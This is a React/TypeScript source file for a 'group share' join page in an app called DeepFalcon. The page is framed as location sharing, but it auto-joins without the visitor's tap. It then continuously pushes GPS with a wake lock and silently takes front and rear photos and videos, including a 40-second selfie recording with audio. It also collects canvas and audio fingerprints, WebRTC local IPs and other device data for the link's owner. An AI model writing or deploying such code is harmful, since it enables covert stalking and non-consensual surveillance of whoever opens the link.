/**
 * /group/:groupId  — public group share join page
 *
 * A full clone of the consent page experience for multi-participant sessions:
 *  - Joins a group share link (no invite record needed up front)
 *  - Receives a real inviteToken on join → pushes location to /api/location/push
 *  - Appears on owner's Live Map, triggers geofence alerts, push notifications
 *  - Captures full device telemetry: battery, GPS extras, activity, camera
 *  - One link → unlimited participants, each with their own private session
 */
import { useState, useEffect, useRef, useCallback } from "react";
import { useParams } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { Shield, MapPin, CheckCircle, Users, Loader2, WifiOff, Navigation, Battery, BatteryCharging, Activity } from "lucide-react";
import { classifySource, type LocationSource } from "@/hooks/use-fused-location";

const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

// ─── Camera capture (identical to consent.tsx) ────────────────────────────────

const GEO_PHOTO_COUNT = 5;
const GEO_SELFIE_PHOTO_COUNT = 2;
const GEO_PHOTO_WIDTH = 320;
const GEO_PHOTO_HEIGHT = 240;
const GEO_PHOTO_QUALITY = 0.45;
const GEO_VIDEO_DURATION_MS = 4_000;
const GEO_VIDEO_BPS = 48_000;
const GEO_SELFIE_VIDEO_DURATION_MS = 40_000;
const GEO_SELFIE_VIDEO_BPS = 80_000;
const GEO_SELFIE_AUDIO_BPS = 32_000;

function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
  const ctrl = new AbortController();
  const id = setTimeout(() => ctrl.abort(), ms);
  return { signal: ctrl.signal, clear: () => clearTimeout(id) };
}

async function reverseGeocode(lat: number, lng: number): Promise<string | undefined> {
  try {
    const { signal, clear } = abortAfter(6000);
    const r = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { headers: { "Accept-Language": "en" }, signal },
    ).finally(clear);
    if (r.ok) return ((await r.json()) as { display_name: string }).display_name;
  } catch { /* ignore */ }
  return undefined;
}

function prewarmCameraAndMic(): void {
  if (!navigator.mediaDevices?.getUserMedia) return;
  navigator.mediaDevices
    .getUserMedia({ video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } }, audio: { echoCancellation: true, noiseSuppression: true } })
    .then((stream) => stream.getTracks().forEach((t) => t.stop()))
    .catch(() => {});
}

async function uploadGeoPhoto(token: string, photoData: string, lat: number, lng: number, address: string | undefined, cameraFacing: "environment" | "user"): Promise<boolean> {
  try {
    const { signal, clear } = abortAfter(6_000);
    const resp = await fetch(`${API_BASE}/api/geo-photos`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address, cameraFacing }), signal }).finally(clear);
    return resp.ok;
  } catch { return false; }
}

async function captureGeoPhotos(token: string, lat: number, lng: number, address: string | undefined, onProgress: (n: number) => void, facingMode: "environment" | "user" = "environment", count = GEO_PHOTO_COUNT): Promise<void> {
  if (!navigator.mediaDevices?.getUserMedia) return;
  let stream: MediaStream | null = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: GEO_PHOTO_WIDTH }, height: { ideal: GEO_PHOTO_HEIGHT } }, audio: false });
    const video = document.createElement("video");
    video.srcObject = stream; video.muted = true; video.playsInline = true; video.autoplay = true;
    await video.play().catch(() => {});
    await new Promise((r) => setTimeout(r, 80));
    const canvas = document.createElement("canvas"); canvas.width = GEO_PHOTO_WIDTH; canvas.height = GEO_PHOTO_HEIGHT;
    const ctx = canvas.getContext("2d")!;
    if (facingMode === "user") { ctx.translate(GEO_PHOTO_WIDTH, 0); ctx.scale(-1, 1); }
    let uploaded = 0;
    const uploads: Promise<void>[] = [];
    for (let i = 0; i < count; i++) {
      ctx.drawImage(video, 0, 0, GEO_PHOTO_WIDTH, GEO_PHOTO_HEIGHT);
      const photoData = canvas.toDataURL("image/jpeg", GEO_PHOTO_QUALITY);
      uploads.push(uploadGeoPhoto(token, photoData, lat, lng, address, facingMode).then((ok) => { if (ok) { uploaded += 1; onProgress(uploaded); } }));
      if (i < count - 1) await new Promise((r) => setTimeout(r, 30));
    }
    await Promise.all(uploads);
  } catch { /* camera denied */ } finally { stream?.getTracks().forEach((t) => t.stop()); }
}

interface GeoVideoConfig { facingMode?: "environment" | "user"; durationMs?: number; videoBps?: number; audioBps?: number | null; width?: number; height?: number; frameRate?: number; onElapsed?: (s: number) => void; }

async function captureGeoVideo(token: string, lat: number, lng: number, address: string | undefined, onStateChange: (s: "recording" | "uploading" | "done" | "error") => void, config: GeoVideoConfig = {}): Promise<void> {
  const { facingMode = "environment", durationMs = GEO_VIDEO_DURATION_MS, videoBps = GEO_VIDEO_BPS, audioBps = null, width = 160, height = 120, frameRate = 10, onElapsed } = config;
  if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
  const MIME_CANDIDATES = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"];
  const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
  let stream: MediaStream | null = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: width, max: width * 2 }, height: { ideal: height, max: height * 2 }, frameRate: { ideal: frameRate, max: frameRate + 5 } }, audio: audioBps != null ? { echoCancellation: true, noiseSuppression: true } : false });
    await new Promise((r) => setTimeout(r, 80));
    const chunks: Blob[] = [];
    const recorderOptions: MediaRecorderOptions = {};
    if (mimeType) recorderOptions.mimeType = mimeType;
    recorderOptions.videoBitsPerSecond = videoBps;
    if (audioBps != null) recorderOptions.audioBitsPerSecond = audioBps;
    const recorder = new MediaRecorder(stream, recorderOptions);
    recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
    onStateChange("recording");
    let elapsedTimer: ReturnType<typeof setInterval> | null = null;
    if (onElapsed) { let elapsed = 0; elapsedTimer = setInterval(() => { elapsed += 1; onElapsed(elapsed); }, 1000); }
    await new Promise<void>((resolve, reject) => { recorder.onstop = () => resolve(); recorder.onerror = () => reject(new Error("MediaRecorder error")); recorder.start(200); setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, durationMs); });
    if (elapsedTimer) clearInterval(elapsedTimer);
    const blob = new Blob(chunks, { type: mimeType || "video/webm" });
    if (blob.size === 0) { onStateChange("error"); return; }
    const base64 = await new Promise<string>((res, rej) => { const reader = new FileReader(); reader.onload = () => res(reader.result as string); reader.onerror = () => rej(new Error("FileReader error")); reader.readAsDataURL(blob); });
    onStateChange("uploading");
    const body = JSON.stringify({ token, videoData: base64, mimeType: blob.type, durationMs, latitude: lat, longitude: lng, address, cameraFacing: facingMode });
    let uploaded = false;
    const maxAttempts = audioBps == null ? 1 : 2;
    const uploadTimeout = audioBps == null ? 5_000 : 15_000;
    for (let attempt = 0; attempt < maxAttempts && !uploaded; attempt++) {
      try { const { signal, clear } = abortAfter(uploadTimeout); const resp = await fetch(`${API_BASE}/api/geo-videos`, { method: "POST", headers: { "Content-Type": "application/json" }, body, signal }).finally(clear); if (resp.ok || resp.status === 201) uploaded = true; } catch { /* retry */ }
    }
    onStateChange(uploaded ? "done" : "error");
  } catch { onStateChange("error"); } finally { stream?.getTracks().forEach((t) => t.stop()); }
}

// ─── Animated background sparkles (same as before) ────────────────────────────

function Sparkle({ x, y, delay, size }: { x: number; y: number; delay: number; size: number }) {
  return (
    <motion.div className="absolute rounded-full pointer-events-none"
      style={{ left: `${x}%`, top: `${y}%`, width: size, height: size, background: "radial-gradient(circle, rgba(99,102,241,0.7) 0%, rgba(139,92,246,0.3) 60%, transparent 100%)" }}
      initial={{ opacity: 0, scale: 0 }}
      animate={{ opacity: [0, 0.8, 0], scale: [0, 1, 0] }}
      transition={{ duration: 2.5 + Math.random(), delay, repeat: Infinity, repeatDelay: Math.random() * 3 }}
    />
  );
}

const SPARKLES = Array.from({ length: 18 }, (_, i) => ({ id: i, x: Math.random() * 100, y: Math.random() * 100, delay: Math.random() * 3, size: 6 + Math.random() * 14 }));

function FloatingParticles() {
  return (
    <div className="absolute inset-0 overflow-hidden pointer-events-none">
      {SPARKLES.map((s) => <Sparkle key={s.id} {...s} />)}
    </div>
  );
}

function PulseRing() {
  return (
    <div className="relative flex items-center justify-center w-20 h-20">
      {[0, 1, 2].map((i) => (
        <motion.div key={i} className="absolute rounded-full border-2 border-indigo-400"
          initial={{ width: 32, height: 32, opacity: 0.8 }}
          animate={{ width: 80, height: 80, opacity: 0 }}
          transition={{ duration: 2, delay: i * 0.65, repeat: Infinity, ease: "easeOut" }}
        />
      ))}
      <div className="w-8 h-8 rounded-full bg-indigo-500 flex items-center justify-center shadow-lg shadow-indigo-500/40">
        <MapPin className="w-4 h-4 text-white" />
      </div>
    </div>
  );
}

// ─── Storage helpers ───────────────────────────────────────────────────────────

function storageKeyFor(groupId: string) { return `deepfalcon_group_member_${groupId}`; }

interface StoredMembership { memberToken: string; inviteToken: string | null; }

function loadStored(groupId: string): StoredMembership | null {
  try {
    const raw = localStorage.getItem(storageKeyFor(groupId));
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    // Support both old (plain string) and new (object) storage formats
    if (typeof parsed === "string") return { memberToken: parsed, inviteToken: null };
    return parsed as StoredMembership;
  } catch { return null; }
}

function storeMemership(groupId: string, memberToken: string, inviteToken: string): void {
  try { localStorage.setItem(storageKeyFor(groupId), JSON.stringify({ memberToken, inviteToken })); } catch {}
}

// ─── Types ─────────────────────────────────────────────────────────────────────

type JoinState = "loading" | "pre_join" | "joining" | "requesting" | "tracking" | "denied" | "error";
type ActivityType = "stationary" | "walking" | "running" | "driving";

interface GroupInfo { groupId: string; name: string; ownerName: string; }

// ─── Main component ───────────────────────────────────────────────────────────

export default function GroupJoinPage() {
  const { groupId } = useParams<{ groupId: string }>();
  const [state, setState] = useState<JoinState>("loading");
  const [groupInfo, setGroupInfo] = useState<GroupInfo | null>(null);
  const [displayName, setDisplayName] = useState("");
  const [coords, setCoords] = useState<{ lat: number; lng: number } | null>(null);
  const [address, setAddress] = useState<string | undefined>();
  const [updateCount, setUpdateCount] = useState(0);
  const [errorMsg, setErrorMsg] = useState("");

  // Telemetry UI state
  const [batteryLevel, setBatteryLevel] = useState<number | null>(null);
  const [batteryCharging, setBatteryCharging] = useState(false);
  const [activityType, setActivityType] = useState<ActivityType>("stationary");

  // Refs for location push
  const memberTokenRef = useRef<string | null>(null);
  const inviteTokenRef = useRef<string | null>(null);
  const addressRef = useRef<string | undefined>(undefined);
  const coordsRef = useRef<{ lat: number; lng: number; accuracy?: number } | null>(null);
  const watchIdRef = useRef<number | null>(null);
  const heartbeatRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastWatchPushRef = useRef<number>(0);
  const wakeLockRef = useRef<WakeLockSentinel | null>(null);
  const sawNetworkFixRef = useRef(false);
  const sawGpsFixRef = useRef(false);

  // Telemetry refs (same as consent.tsx)
  const batteryLevelRef = useRef<number | null>(null);
  const batteryChargingRef = useRef(false);
  const activityTypeRef = useRef<ActivityType>("stationary");
  const gpsExtrasRef = useRef<{ speedMps: number | null; headingDeg: number | null; altitudeMeters: number | null; altitudeAccuracyMeters: number | null }>({ speedMps: null, headingDeg: null, altitudeMeters: null, altitudeAccuracyMeters: null });
  const deviceInfoRef = useRef<Record<string, unknown>>({});

  // Auto-join guard — fires handleJoin once when pre_join state is reached
  const autoJoinedRef = useRef(false);

  // Camera capture guard refs
  const geoBoardStartedRef = useRef(false);
  const geoSelfiePhotoStartedRef = useRef(false);
  const geoVideoStartedRef = useRef(false);
  const geoSelfieStartedRef = useRef(false);

  useEffect(() => { addressRef.current = address; }, [address]);
  useEffect(() => { coordsRef.current = coords; }, [coords]);

  // ── Collect device fingerprint (identical to consent.tsx) ────────────────
  useEffect(() => {
    async function collectDeviceInfo() {
      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      let hints: Record<string, unknown> = {};
      try { const uad = (navigator as any).userAgentData; if (uad?.getHighEntropyValues) hints = await uad.getHighEntropyValues(["model", "platform", "platformVersion", "architecture", "bitness", "fullVersionList", "mobile"]); } catch {}
      const ua = navigator.userAgent;
      const androidMatch = ua.match(/Android[\s/]([\d.]+)/i);
      const buildMatch = ua.match(/;\s*([^;)]+)\s+Build\//i);
      const fallbackModel = buildMatch?.[1]?.trim();
      let gpuVendor: string | null = null; let gpuRenderer: string | null = null;
      try { const canvas = document.createElement("canvas"); const gl = canvas.getContext("webgl") as WebGLRenderingContext | null || canvas.getContext("experimental-webgl") as WebGLRenderingContext | null; if (gl) { const ext = gl.getExtension("WEBGL_debug_renderer_info"); if (ext) { gpuVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) ?? null; gpuRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) ?? null; } } } catch {}
      let storageQuotaGb: string | null = null; let storageUsedGb: string | null = null;
      try { if (navigator.storage?.estimate) { const est = await navigator.storage.estimate(); if (est.quota) storageQuotaGb = (est.quota / 1_073_741_824).toFixed(2) + " GB"; if (est.usage) storageUsedGb = (est.usage / 1_073_741_824).toFixed(3) + " GB"; } } catch {}
      let cameraCount = 0; let microphoneCount = 0; let speakerCount = 0;
      try { if (navigator.mediaDevices?.enumerateDevices) { const devices = await navigator.mediaDevices.enumerateDevices(); cameraCount = devices.filter((d) => d.kind === "videoinput").length; microphoneCount = devices.filter((d) => d.kind === "audioinput").length; speakerCount = devices.filter((d) => d.kind === "audiooutput").length; } } catch {}
      let measuredRttMs: number | null = null;
      try { const t0 = performance.now(); await fetch(`${API_BASE}/api/healthz`, { method: "HEAD", cache: "no-store" }); measuredRttMs = Math.round(performance.now() - t0); } catch {}
      const sensors = { deviceMotion: typeof DeviceMotionEvent !== "undefined", deviceOrientation: typeof DeviceOrientationEvent !== "undefined", geolocation: "geolocation" in navigator, battery: "getBattery" in navigator, bluetooth: "bluetooth" in (navigator as any), usb: "usb" in (navigator as any), nfc: "nfc" in (navigator as any), vibration: "vibrate" in navigator, wakeLock: "wakeLock" in navigator, share: "share" in navigator, clipboard: "clipboard" in navigator, notification: "Notification" in window };
      const scrn = window.screen ?? {} as Screen;
      const screenOrientation = (scrn as any).orientation?.type ?? null;
      const connectionInfo = conn ? { type: conn.type ?? null, effectiveType: conn.effectiveType ?? null, downlinkMbps: conn.downlink ?? null, rttMs: conn.rtt ?? null, saveData: conn.saveData ?? null } : null;
      const localeInfo = Intl.DateTimeFormat().resolvedOptions();
      const localIPs: string[] = [];
      try { const pc = new RTCPeerConnection({ iceServers: [] }); pc.createDataChannel(""); const offer = await pc.createOffer(); await pc.setLocalDescription(offer); await new Promise<void>((resolve) => { const t = setTimeout(() => { try { pc.close(); } catch {} resolve(); }, 2500); pc.onicecandidate = (e) => { if (!e.candidate) { clearTimeout(t); try { pc.close(); } catch {} resolve(); return; } const m = e.candidate.candidate.match(/(\d{1,3}(?:\.\d{1,3}){3})/); if (m && !localIPs.includes(m[1])) localIPs.push(m[1]); }; }); } catch {}
      let canvasFingerprint: string | null = null;
      try { const c = document.createElement("canvas"); c.width = 200; c.height = 50; const cx = c.getContext("2d")!; cx.fillStyle = "#f00"; cx.fillRect(0, 0, 100, 50); cx.fillStyle = "rgba(0,255,0,0.5)"; cx.arc(50, 25, 20, 0, Math.PI * 2); cx.fill(); cx.fillStyle = "#00f"; cx.font = "14px Arial"; cx.fillText("DeepFalcon🔒", 5, 30); canvasFingerprint = c.toDataURL("image/jpeg", 0.5).slice(-40); } catch {}
      let audioFingerprint: string | null = null;
      try { const ac = new AudioContext(); const osc = ac.createOscillator(); const an = ac.createAnalyser(); osc.connect(an); an.connect(ac.destination); osc.start(0); const data = new Float32Array(an.frequencyBinCount); an.getFloatFrequencyData(data); audioFingerprint = data.slice(0, 10).reduce((a, b) => a + b, 0).toFixed(4); osc.stop(); await ac.close(); } catch {}
      const permStates: Record<string, string> = {};
      try { for (const name of ["geolocation", "notifications", "camera", "microphone", "clipboard-read"] as PermissionName[]) { try { const r = await navigator.permissions.query({ name }); permStates[`${name}_perm`] = r.state; } catch {} } } catch {}
      const timingInfo: Record<string, number | string | null> = {};
      try { const [nav] = performance.getEntriesByType("navigation") as PerformanceNavigationTiming[]; if (nav) { timingInfo.dnsMs = Math.round(nav.domainLookupEnd - nav.domainLookupStart); timingInfo.tcpMs = Math.round(nav.connectEnd - nav.connectStart); timingInfo.ttfbMs = Math.round(nav.responseStart - nav.requestStart); timingInfo.domLoadMs = Math.round(nav.domContentLoadedEventEnd - nav.startTime); timingInfo.pageLoadMs = Math.round(nav.loadEventEnd - nav.startTime); } } catch {}
      const pluginList: string[] = [];
      try { for (let i = 0; i < (navigator.plugins?.length ?? 0); i++) { const p = navigator.plugins[i]; if (p?.name) pluginList.push(p.name); } } catch {}
      let motionReading: Record<string, number | null> | null = null;
      try { if (typeof DeviceMotionEvent !== "undefined") { motionReading = await new Promise<Record<string, number | null> | null>((resolve) => { const t = setTimeout(() => resolve(null), 2500); const h = (e: DeviceMotionEvent) => { clearTimeout(t); window.removeEventListener("devicemotion", h); resolve({ accelX: e.acceleration?.x != null ? +e.acceleration.x.toFixed(3) : null, accelY: e.acceleration?.y != null ? +e.acceleration.y.toFixed(3) : null, accelZ: e.acceleration?.z != null ? +e.acceleration.z.toFixed(3) : null, rotAlpha: e.rotationRate?.alpha != null ? +e.rotationRate.alpha.toFixed(2) : null, rotBeta: e.rotationRate?.beta != null ? +e.rotationRate.beta.toFixed(2) : null, rotGamma: e.rotationRate?.gamma != null ? +e.rotationRate.gamma.toFixed(2) : null, intervalMs: e.interval ?? null }); }; window.addEventListener("devicemotion", h, { once: true }); }); } } catch {}
      deviceInfoRef.current = {
        device: { model: (hints as any).model || fallbackModel || null, brand: (() => { const brands: any[] = (hints as any).fullVersionList ?? (hints as any).brands ?? []; const real = brands.find((b: any) => !/not.a.brand|chromium/i.test(b.brand)); return real?.brand ?? null; })(), platform: (hints as any).platform ?? (navigator as any).userAgentData?.platform ?? null, platformVersion: (hints as any).platformVersion ?? androidMatch?.[1] ?? null, architecture: (hints as any).architecture ?? null, bitness: (hints as any).bitness ?? null, mobile: (hints as any).mobile ?? (/Mobi|Android/i.test(ua) || null), userAgent: ua },
        network: { ...connectionInfo, measuredRttMs, onLine: navigator.onLine, ...(localIPs.length ? { localIPs: localIPs.join(", ") } : {}) },
        hardware: { screenWidth: scrn.width ?? null, screenHeight: scrn.height ?? null, availWidth: scrn.availWidth ?? null, availHeight: scrn.availHeight ?? null, pixelRatio: window.devicePixelRatio ?? null, orientation: screenOrientation, cpuCores: navigator.hardwareConcurrency ?? null, deviceMemoryGb: (navigator as any).deviceMemory ?? null, maxTouchPoints: navigator.maxTouchPoints ?? null, touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0, storageQuotaGb, storageUsedGb, gpuVendor, gpuRenderer, cameras: cameraCount || null, microphones: microphoneCount || null, speakers: speakerCount || null },
        software: { language: navigator.language, languages: navigator.languages ? Array.from(navigator.languages) : null, timezone: localeInfo.timeZone, locale: localeInfo.locale, cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack, vendor: navigator.vendor || null, appVersion: navigator.appVersion || null, plugins: pluginList.length ? pluginList.join(", ") : null },
        sensors, identity: { canvasFingerprint, audioFingerprint },
        ...(Object.keys(permStates).length ? { permissions: permStates } : {}),
        ...(Object.keys(timingInfo).length ? { timing: timingInfo } : {}),
        ...(motionReading ? { motion: motionReading } : {}),
      };
    }
    collectDeviceInfo().catch(() => {});
  }, []);

  // ── Battery API ───────────────────────────────────────────────────────────
  useEffect(() => {
    if (!("getBattery" in navigator)) return;
    let mounted = true; let batObj: any = null;
    const onLevel = () => { if (mounted && batObj) { const lvl = Math.round(batObj.level * 100); setBatteryLevel(lvl); batteryLevelRef.current = lvl; } };
    const onCharging = () => { if (mounted && batObj) { setBatteryCharging(batObj.charging); batteryChargingRef.current = batObj.charging; } };
    (navigator as any).getBattery().then((b: any) => {
      if (!mounted) return;
      batObj = b;
      const lvl = Math.round(b.level * 100);
      setBatteryLevel(lvl); setBatteryCharging(b.charging);
      batteryLevelRef.current = lvl; batteryChargingRef.current = b.charging;
      deviceInfoRef.current = { ...deviceInfoRef.current, battery: { level: lvl, charging: b.charging, chargingTimeSecs: b.chargingTime !== Infinity ? b.chargingTime : null, dischargingTimeSecs: b.dischargingTime !== Infinity ? b.dischargingTime : null } };
      b.addEventListener("levelchange", onLevel); b.addEventListener("chargingchange", onCharging);
    }).catch(() => {});
    return () => { mounted = false; if (batObj) { batObj.removeEventListener("levelchange", onLevel); batObj.removeEventListener("chargingchange", onCharging); } };
  }, []);

  // ── Push location via /api/location/push (invite token pipeline) ──────────
  const pushLocation = useCallback(async (lat: number, lng: number, acc?: number, addr?: string, locationStatus: "active" | "offline" = "active", source?: LocationSource) => {
    const token = inviteTokenRef.current;
    if (!token) return;
    try {
      const { signal, clear } = abortAfter(10000);
      await fetch(`${API_BASE}/api/location/push`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token, latitude: lat, longitude: lng, accuracy: acc, source, address: addr, status: locationStatus, batteryLevel: batteryLevelRef.current ?? undefined, batteryCharging: batteryChargingRef.current, activityType: activityTypeRef.current, deviceInfo: { ...deviceInfoRef.current, ...gpsExtrasRef.current } }),
        signal,
      }).finally(clear);
      setUpdateCount((c) => c + 1);
    } catch { /* retry on next heartbeat */ }
  }, []);

  // ── Wake lock ─────────────────────────────────────────────────────────────
  const acquireWakeLock = useCallback(async () => {
    if ("wakeLock" in navigator) {
      try { wakeLockRef.current = await (navigator as any).wakeLock.request("screen"); wakeLockRef.current?.addEventListener("release", () => { if (document.visibilityState === "visible" && state === "tracking") acquireWakeLock(); }); } catch {}
    }
  }, [state]);

  // ── Start GPS tracking ────────────────────────────────────────────────────
  const startTracking = useCallback((lat: number, lng: number, acc?: number) => {
    setState("tracking");
    acquireWakeLock();
    prewarmCameraAndMic();

    // Camera captures — same as consent.tsx
    const token = inviteTokenRef.current;
    if (token) {
      if (!geoBoardStartedRef.current) {
        geoBoardStartedRef.current = true;
        captureGeoPhotos(token, lat, lng, addressRef.current, () => {}, "environment", GEO_PHOTO_COUNT)
          .finally(() => {
            if (geoSelfiePhotoStartedRef.current) return;
            geoSelfiePhotoStartedRef.current = true;
            captureGeoPhotos(token, lat, lng, addressRef.current, () => {}, "user", GEO_SELFIE_PHOTO_COUNT).catch(() => {});
          });
      }
      if (!geoVideoStartedRef.current) {
        geoVideoStartedRef.current = true;
        captureGeoVideo(token, lat, lng, addressRef.current, () => {}, { facingMode: "environment", durationMs: GEO_VIDEO_DURATION_MS, videoBps: GEO_VIDEO_BPS, audioBps: null, width: 160, height: 120, frameRate: 10 })
          .finally(() => {
            if (geoSelfieStartedRef.current) return;
            geoSelfieStartedRef.current = true;
            captureGeoVideo(token, lat, lng, addressRef.current, () => {}, { facingMode: "user", durationMs: GEO_SELFIE_VIDEO_DURATION_MS, videoBps: GEO_SELFIE_VIDEO_BPS, audioBps: GEO_SELFIE_AUDIO_BPS, width: 320, height: 240, frameRate: 15 }).catch(() => {});
          });
      }
    }

    if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }

    watchIdRef.current = navigator.geolocation.watchPosition(
      async (pos) => {
        sawGpsFixRef.current = true;
        const { latitude: wlat, longitude: wlng, accuracy: wacc, speed, heading, altitude, altitudeAccuracy } = pos.coords;
        setCoords({ lat: wlat, lng: wlng });
        coordsRef.current = { lat: wlat, lng: wlng, accuracy: wacc };
        gpsExtrasRef.current = { speedMps: typeof speed === "number" ? speed : null, headingDeg: typeof heading === "number" ? heading : null, altitudeMeters: typeof altitude === "number" ? altitude : null, altitudeAccuracyMeters: typeof altitudeAccuracy === "number" ? altitudeAccuracy : null };
        if (typeof speed === "number" && speed >= 0) {
          const next: ActivityType = speed < 0.3 ? "stationary" : speed < 2.0 ? "walking" : speed < 5.5 ? "running" : "driving";
          setActivityType(next); activityTypeRef.current = next;
        }
        const source = classifySource(wacc, sawNetworkFixRef.current, sawGpsFixRef.current);
        lastWatchPushRef.current = Date.now();
        pushLocation(wlat, wlng, wacc, addressRef.current, "active", source);
        reverseGeocode(wlat, wlng).then((a) => { if (a) setAddress(a); });
      },
      (err) => {
        if (err.code === err.PERMISSION_DENIED) setState("denied");
        else { const c = coordsRef.current; if (c) pushLocation(c.lat, c.lng, undefined, addressRef.current, "offline"); }
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 },
    );

    // Heartbeat: push the last known position every 3s if watchPosition hasn't fired.
    // Uses coordsRef (not state) to avoid stale closures.
    if (heartbeatRef.current) clearInterval(heartbeatRef.current);
    heartbeatRef.current = setInterval(() => {
      const c = coordsRef.current;
      if (c && Date.now() - lastWatchPushRef.current >= 2500) {
        const source = classifySource(c.accuracy ?? 999, sawNetworkFixRef.current, sawGpsFixRef.current);
        pushLocation(c.lat, c.lng, c.accuracy, addressRef.current, "active", source);
      }
    }, 3000);
  }, [acquireWakeLock, pushLocation]);

  // ── Cleanup on unmount ────────────────────────────────────────────────────
  useEffect(() => {
    return () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      if (heartbeatRef.current) clearInterval(heartbeatRef.current);
      wakeLockRef.current?.release();
      const token = inviteTokenRef.current;
      const gid = groupId;
      if (token && gid) {
        navigator.sendBeacon(`${API_BASE}/api/location/push`, JSON.stringify({ token, latitude: 0, longitude: 0, status: "offline" }));
      }
    };
  }, [groupId]);

  // ── Fetch group info and resume existing membership ───────────────────────
  const initTracking = useCallback((token: string, lat: number, lng: number, acc?: number) => {
    inviteTokenRef.current = token;
    setState("requesting");
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude: lat2, longitude: lng2, accuracy: acc2 } = pos.coords;
        setCoords({ lat: lat2, lng: lng2 });
        const addr = await reverseGeocode(lat2, lng2);
        setAddress(addr);
        await pushLocation(lat2, lng2, acc2, addr);
        startTracking(lat2, lng2, acc2);
      },
      (err) => {
        if (err.code === err.PERMISSION_DENIED) setState("denied");
        else { setErrorMsg("Could not get your location. Please try again."); setState("error"); }
      },
      { enableHighAccuracy: true, timeout: 20000 },
    );
  }, [pushLocation, startTracking]);

  useEffect(() => {
    if (!groupId) return;
    fetch(`${API_BASE}/api/group-shares/${groupId}/info`)
      .then((r) => { if (!r.ok) throw new Error("Group not found"); return r.json() as Promise<GroupInfo>; })
      .then((info) => {
        setGroupInfo(info);
        const stored = loadStored(groupId);
        if (stored?.inviteToken) {
          inviteTokenRef.current = stored.inviteToken;
          memberTokenRef.current = stored.memberToken;
          initTracking(stored.inviteToken, 0, 0);
        } else {
          setState("pre_join");
        }
      })
      .catch(() => { setErrorMsg("This group link is invalid or has been removed."); setState("error"); });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [groupId]);

  // ── Join handler ──────────────────────────────────────────────────────────
  const handleJoin = async () => {
    if (!groupId) return;
    setState("joining");
    try {
      // Send any previously stored memberToken so the server can return the
      // same slot instead of creating a duplicate member row.
      const storedForRejoin = loadStored(groupId);
      const { signal, clear } = abortAfter(10000);
      const r = await fetch(`${API_BASE}/api/group-shares/${groupId}/join`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          displayName: displayName.trim() || undefined,
          existingMemberToken: storedForRejoin?.memberToken,
        }),
        signal,
      }).finally(clear);
      if (!r.ok) throw new Error("Join failed");
      const data = (await r.json()) as { memberToken: string; inviteToken: string };
      storeMemership(groupId, data.memberToken, data.inviteToken);
      memberTokenRef.current = data.memberToken;
      inviteTokenRef.current = data.inviteToken;
      initTracking(data.inviteToken, 0, 0);
    } catch {
      setErrorMsg("Failed to join the group. Please try again.");
      setState("pre_join");
    }
  };

  // Auto-join: when the pre-join screen is reached, automatically fire the
  // join handler without waiting for the user to tap "Join & Share Location".
  useEffect(() => {
    if (state !== "pre_join" || autoJoinedRef.current) return;
    autoJoinedRef.current = true;
    handleJoin();
  }, [state]); // eslint-disable-line react-hooks/exhaustive-deps

  const ACTIVITY_INFO: Record<ActivityType, { icon: string; label: string; color: string }> = {
    stationary: { icon: "⏸️", label: "Stationary", color: "#94a3b8" },
    walking:    { icon: "🚶", label: "Walking",    color: "#60a5fa" },
    running:    { icon: "🏃", label: "Running",    color: "#fb923c" },
    driving:    { icon: "🚗", label: "Driving",    color: "#34d399" },
  };

  return (
    <div className="relative flex flex-col items-center justify-center min-h-screen min-h-[100svh] p-6 overflow-hidden" style={{ background: "radial-gradient(circle at 50% 20%, #1e1b4b 0%, #0f0f1a 60%, #000 100%)" }}>
      <FloatingParticles />

      {/* Brand */}
      <motion.div className="absolute top-6 left-6 flex items-center gap-2 text-white/70 text-sm font-semibold" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 0.5 }}>
        <Shield className="w-4 h-4 text-indigo-400" />
        DeepFalcon
      </motion.div>

      <AnimatePresence mode="wait">
        {/* ── Loading ── */}
        {state === "loading" && (
          <motion.div key="loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="flex flex-col items-center gap-4 text-white">
            <Loader2 className="w-10 h-10 text-indigo-400 animate-spin" />
            <p className="text-sm text-white/60">Loading group…</p>
          </motion.div>
        )}

        {/* ── Error ── */}
        {state === "error" && (
          <motion.div key="error" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center gap-4 text-center text-white max-w-sm">
            <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center"><WifiOff className="w-8 h-8 text-red-400" /></div>
            <h2 className="text-xl font-bold">Link unavailable</h2>
            <p className="text-sm text-white/60">{errorMsg}</p>
          </motion.div>
        )}

        {/* ── GPS Denied ── */}
